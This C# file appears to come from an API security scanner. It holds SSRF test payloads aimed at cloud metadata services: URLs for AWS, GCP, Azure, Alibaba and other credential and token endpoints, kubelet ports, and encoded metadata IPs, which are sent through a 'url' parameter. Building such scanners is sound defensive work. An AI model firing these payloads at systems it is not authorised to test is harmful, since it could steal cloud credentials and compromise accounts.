namespace API_Tester;

public partial class MainPage
{
    /*
    Cloud Metadata Service (IMDSv2) SSRF Test Payloads

    Purpose:
    Provides payloads used to detect Server-Side Request Forgery (SSRF) attempts
    targeting cloud instance metadata services, particularly AWS Instance Metadata
    Service Version 2 (IMDSv2).

    Threat Model:
    Cloud providers expose instance metadata endpoints that allow workloads to
    retrieve configuration data and temporary credentials. If an application
    performs server-side HTTP requests using user-controlled input, an attacker
    may attempt to access these internal metadata endpoints.

    The AWS metadata service is typically available at:

        http://169.254.169.254/

    IMDSv2 requires a session token obtained through a PUT request to:

        /latest/api/token

    followed by metadata queries using the token.

    Test Strategy:
    These payloads attempt to reach common metadata endpoints used by AWS,
    Azure, and other cloud environments. The scanner uses them to determine
    whether the application allows outbound requests to internal metadata
    services.

    Indicators of successful access may include responses containing:

        metadata
        instance-id
        iam/security-credentials
        compute metadata

    Potential Impact:
    If metadata services are accessible through SSRF, attackers may obtain:

        - temporary IAM credentials
        - instance identity information
        - internal network configuration
        - cloud environment details

    These credentials may allow escalation into cloud account resources.

    Expected Behavior:
    Applications should restrict outbound requests to internal metadata
    addresses and implement SSRF protections such as allowlists,
    network isolation, or metadata service protections (e.g., IMDSv2).
    */

    private static string[] GetCloudMetadataImdsV2Payloads() =>
    ExpandHttpToHttps(new[]
    {
        // AWS EC2 Metadata (IMDS)
        "http://169.254.169.254/",
        "http://169.254.169.254/latest/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/dynamic/",
        "http://169.254.169.254/latest/dynamic/instance-identity/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "http://169.254.169.254/latest/meta-data/iam/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/api/token",

        // AWS IPv6 IMDS
        "http://[fd00:ec2::254]/",
        "http://[fd00:ec2::254]/latest/",
        "http://[fd00:ec2::254]/latest/meta-data/",
        "http://[fd00:ec2::254]/latest/api/token",

        // Google Cloud Metadata
        "http://metadata.google.internal/",
        "http://metadata.google.internal/computeMetadata/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/",
        "http://metadata.google.internal/computeMetadata/v1/project/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",

        // Alternate GCP IP access
        "http://169.254.169.254/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/instance/",
        "http://169.254.169.254/computeMetadata/v1/project/",

        // Azure Instance Metadata
        "http://169.254.169.254/metadata/",
        "http://169.254.169.254/metadata/instance",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token",

        // DigitalOcean Metadata
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1/id",
        "http://169.254.169.254/metadata/v1/hostname",
        "http://169.254.169.254/metadata/v1/user-data",
        "http://169.254.169.254/metadata/v1/region",
        "http://169.254.169.254/metadata/v1/interfaces/",

        // Oracle Cloud Metadata
        "http://169.254.169.254/opc/v1/",
        "http://169.254.169.254/opc/v1/instance/",
        "http://169.254.169.254/opc/v1/vnics/",
        "http://169.254.169.254/opc/v2/",
        "http://169.254.169.254/opc/v2/instance/",

        // Alibaba Cloud Metadata
        "http://100.100.100.200/",
        "http://100.100.100.200/latest/",
        "http://100.100.100.200/latest/meta-data/",
        "http://100.100.100.200/latest/user-data",
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        "http://100.100.100.200/latest/meta-data/instance-id",

        // OpenStack Metadata
        "http://169.254.169.254/openstack/",
        "http://169.254.169.254/openstack/latest/",
        "http://169.254.169.254/openstack/latest/meta_data.json",
        "http://169.254.169.254/openstack/latest/user_data",
        "http://169.254.169.254/openstack/latest/network_data.json",

        // Kubernetes / kubelet
        "http://127.0.0.1:10255/",
        "http://127.0.0.1:10255/pods",
        "http://127.0.0.1:10250/",
        "http://127.0.0.1:10250/pods",

        // Generic Metadata Aliases
        "http://metadata/",
        "http://instance-data/",
        "http://instance-data/latest/meta-data/",
        "http://metadata.internal/",

        // Loopback Targets (SSRF)
        "http://127.0.0.1/",
        "http://localhost/",
        "http://0.0.0.0/",
        "http://127.1/",
        "http://127.0.1.1/",

        // Encoded Metadata IP Variants
        "http://2852039166",
        "http://0xA9FEA9FE",
        "http://0251.0376.0251.0376"
    });

    private static HttpRequestMessage FormatCloudMetadataImdsV2Request(Uri uri)
    {
        var req = new HttpRequestMessage(HttpMethod.Get, uri);
        req.Headers.TryAddWithoutValidation("Metadata-Flavor", "Google");
        req.Headers.TryAddWithoutValidation("x-aws-ec2-metadata-token-ttl-seconds", "21600");
        return req;
    }

    private async Task<string> RunCloudMetadataImdsV2TestsAsync(Uri baseUri)
    {
        var payloads = GetManualPayloadsOrDefault(GetCloudMetadataImdsV2Payloads(), ManualPayloadCategory.Ssrf);
        payloads = ExpandHttpToHttps(payloads);

        return await RunPayloadProbeAsync(
            baseUri,
            "Cloud Metadata (IMDSv2) Probe",
            payloads,
            new PayloadProbeOptions
            {
                QueryPayloadParameters = ["url"],
                RequestFactory = FormatCloudMetadataImdsV2Request
            });
    }
}

